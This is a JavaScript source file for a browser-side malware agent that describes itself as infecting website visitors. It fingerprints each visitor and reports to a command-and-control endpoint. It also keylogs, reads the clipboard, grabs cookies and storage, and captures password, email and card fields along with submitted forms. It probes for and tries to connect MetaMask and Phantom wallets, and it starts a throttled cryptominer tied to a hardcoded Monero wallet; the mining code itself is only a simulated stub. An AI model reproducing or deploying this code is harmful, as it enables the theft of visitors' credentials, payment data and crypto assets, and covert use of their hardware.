/**
 * BROWSER AGENT - Infects website visitors
 * Runs in browser context, collects data and mines via WebAssembly
 */

(function() {
    'use strict';
    
    const C2_SERVER = window.location.origin;
    const WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5';
    const POOL = 'pool.monero.hashvault.pro:443';
    
    let agentId = null;
    let miningWorker = null;
    let isMining = false;
    let hashRate = 0;
    
    // Generate unique agent ID
    function generateAgentId() {
        const data = navigator.userAgent + navigator.language + screen.width + screen.height + Date.now();
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(16).padStart(8, '0');
    }
    
    // Get browser fingerprint
    function getFingerprint() {
        return {
            agent_id: agentId,
            user_agent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency || 1,
            memory: navigator.deviceMemory || 0,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            localStorage: typeof localStorage !== 'undefined',
            sessionStorage: typeof sessionStorage !== 'undefined',
            webgl: getWebGLInfo(),
            canvas: getCanvasFingerprint(),
            fonts: getFonts(),
            plugins: getPlugins(),
            url: window.location.href,
            referrer: document.referrer,
            timestamp: Date.now()
        };
    }
    
    // WebGL info
    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
        } catch (e) {}
        return null;
    }
    
    // Canvas fingerprint
    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Browser Agent', 2, 15);
            return canvas.toDataURL().slice(-50);
        } catch (e) {
            return null;
        }
    }
    
    // Detect fonts
    function getFonts() {
        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
        const available = [];
        const testStr = 'mmmmmmmmmmlli';
        const testSize = '72px';
        const h = document.getElementsByTagName('body')[0];
        const span = document.createElement('span');
        span.style.fontSize = testSize;
        span.innerHTML = testStr;
        span.style.fontFamily = 'monospace';
        h.appendChild(span);
        const defaultWidth = span.offsetWidth;
        
        fonts.forEach(font => {
            span.style.fontFamily = font + ', monospace';
            if (span.offsetWidth !== defaultWidth) {
                available.push(font);
            }
        });
        
        h.removeChild(span);
        return available;
    }
    
    // Get plugins
    function getPlugins() {
        const plugins = [];
        if (navigator.plugins) {
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
        }
        return plugins.slice(0, 10);
    }
    
    // Register with C2
    async function register() {
        try {
            const fingerprint = getFingerprint();
            const response = await fetch(`${C2_SERVER}/api/agent/register`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fingerprint)
            });
            const data = await response.json();
            if (data.status === 'ok') {
                console.log('[Browser Agent] Registered:', agentId);
                localStorage.setItem('agent_id', agentId);
                return true;
            }
        } catch (e) {
            console.error('[Browser Agent] Registration failed:', e);
        }
        return false;
    }
    
    // Collect browser data
    function collectData() {
        const data = {
            cookies: document.cookie,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            forms: collectFormData(),
            inputs: collectInputValues(),
            timestamp: Date.now()
        };
        return data;
    }
    
    // Collect form data
    function collectFormData() {
        const forms = [];
        document.querySelectorAll('form').forEach(form => {
            const formData = {};
            form.querySelectorAll('input, textarea, select').forEach(el => {
                if (el.name && el.value) {
                    formData[el.name] = el.value;
                }
            });
            if (Object.keys(formData).length > 0) {
                forms.push(formData);
            }
        });
        return forms;
    }
    
    // Collect input values
    function collectInputValues() {
        const inputs = {};
        const sensitiveTypes = ['password', 'email', 'tel', 'credit-card', 'cardnumber', 'cvv', 'ssn'];
        document.querySelectorAll('input').forEach(input => {
            if (input.value && (input.type === 'text' || sensitiveTypes.includes(input.type))) {
                inputs[input.name || input.id || 'unknown'] = input.value;
            }
        });
        return inputs;
    }
    
    // Start mining using WebAssembly (simulated - would need actual WASM miner)
    function startMining() {
        if (isMining) return;
        
        console.log('[Browser Agent] Starting mining...');
        isMining = true;
        
        // In production, would load actual WASM miner like hashvault's script
        // For now, simulate with Web Worker
        const miningCode = `
            let hashCount = 0;
            setInterval(() => {
                // Simulate hashing
                for (let i = 0; i < 1000; i++) {
                    const data = new Uint8Array(32);
                    crypto.getRandomValues(data);
                    hashCount++;
                }
                postMessage({ type: 'hashrate', count: hashCount });
                hashCount = 0;
            }, 1000);
        `;
        
        const blob = new Blob([miningCode], { type: 'application/javascript' });
        miningWorker = new Worker(URL.createObjectURL(blob));
        
        miningWorker.onmessage = (e) => {
            if (e.data.type === 'hashrate') {
                hashRate = e.data.count;
                reportMiningStatus();
            }
        };
        
        // Use 50% of available cores
        const threads = Math.max(1, Math.floor((navigator.hardwareConcurrency || 1) / 2));
        console.log(`[Browser Agent] Mining with ${threads} threads`);
    }
    
    // Stop mining
    function stopMining() {
        if (miningWorker) {
            miningWorker.terminate();
            miningWorker = null;
        }
        isMining = false;
        hashRate = 0;
        console.log('[Browser Agent] Mining stopped');
    }
    
    // Report mining status
    async function reportMiningStatus() {
        try {
            await fetch(`${C2_SERVER}/api/agent/result`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agent_id: agentId,
                    type: 'mining_status',
                    hashrate: hashRate,
                    is_mining: isMining
                })
            });
        } catch (e) {}
    }
    
    // Submit collected data
    async function submitData(data) {
        try {
            await fetch(`${C2_SERVER}/api/agent/data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agent_id: agentId,
                    data: data
                })
            });
        } catch (e) {
            console.error('[Browser Agent] Data submission failed:', e);
        }
    }
    
    // Keylogger
    function startKeylogger() {
        document.addEventListener('keydown', (e) => {
            const keyData = {
                key: e.key,
                code: e.code,
                target: e.target.tagName,
                targetName: e.target.name || e.target.id || '',
                timestamp: Date.now()
            };
            
            // Store locally and batch send
            let keys = JSON.parse(localStorage.getItem('keylog') || '[]');
            keys.push(keyData);
            if (keys.length > 100) {
                submitData({ keylog: keys });
                keys = [];
            }
            localStorage.setItem('keylog', JSON.stringify(keys));
        });
    }
    
    // Clipboard monitor
    function startClipboardMonitor() {
        document.addEventListener('copy', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text && text.length > 5) {
                    submitData({ clipboard: text });
                }
            } catch (e) {}
        });
        
        document.addEventListener('paste', (e) => {
            const text = e.clipboardData.getData('text');
            if (text && text.length > 5) {
                submitData({ clipboard: text });
            }
        });
    }
    
    // Form submission interceptor
    function interceptForms() {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                const formData = new FormData(form);
                const data = {};
                formData.forEach((value, key) => {
                    data[key] = value;
                });
                submitData({ form_submit: data, url: window.location.href });
            });
        });
    }
    
    // Cookie monitor
    function monitorCookies() {
        let lastCookies = document.cookie;
        setInterval(() => {
            if (document.cookie !== lastCookies) {
                lastCookies = document.cookie;
                submitData({ cookies: lastCookies });
            }
        }, 5000);
    }
    
    // Check for crypto wallet extensions
    function detectWallets() {
        const wallets = [];
        
        // MetaMask
        if (window.ethereum && window.ethereum.isMetaMask) {
            wallets.push({ name: 'MetaMask', type: 'ethereum' });
        }
        
        // Phantom
        if (window.solana && window.solana.isPhantom) {
            wallets.push({ name: 'Phantom', type: 'solana' });
        }
        
        // Trust Wallet
        if (window.trustWallet) {
            wallets.push({ name: 'Trust Wallet', type: 'multi' });
        }
        
        // Coinbase Wallet
        if (window.coinbaseWalletExtension) {
            wallets.push({ name: 'Coinbase', type: 'ethereum' });
        }
        
        return wallets;
    }
    
    // Try to connect to wallets
    async function connectWallets() {
        const wallets = detectWallets();
        
        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                if (accounts.length > 0) {
                    submitData({ wallet_addresses: accounts, wallet_type: 'ethereum' });
                }
            } catch (e) {}
        }
        
        if (window.solana) {
            try {
                const response = await window.solana.connect();
                if (response.publicKey) {
                    submitData({ wallet_address: response.publicKey.toString(), wallet_type: 'solana' });
                }
            } catch (e) {}
        }
        
        return wallets;
    }
    
    // Main initialization
    async function init() {
        // Check if already registered
        agentId = localStorage.getItem('agent_id') || generateAgentId();
        
        console.log('[Browser Agent] Initializing:', agentId);
        
        // Register with C2
        await register();
        
        // Start data collection
        startKeylogger();
        startClipboardMonitor();
        interceptForms();
        monitorCookies();
        
        // Detect and connect wallets
        const wallets = detectWallets();
        if (wallets.length > 0) {
            console.log('[Browser Agent] Wallets detected:', wallets);
            connectWallets();
        }
        
        // Start mining (throttled to avoid detection)
        setTimeout(() => {
            startMining();
        }, 5000);
        
        // Periodic data collection
        setInterval(() => {
            const data = collectData();
            if (Object.keys(data.inputs).length > 0) {
                submitData(data);
            }
        }, 30000);
        
        // Heartbeat
        setInterval(async () => {
            await register();
        }, 60000);
        
        console.log('[Browser Agent] Ready');
    }
    
    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // Expose for debugging
    window.__browserAgent = {
        id: agentId,
        startMining,
        stopMining,
        collectData,
        getFingerprint
    };
    
})();
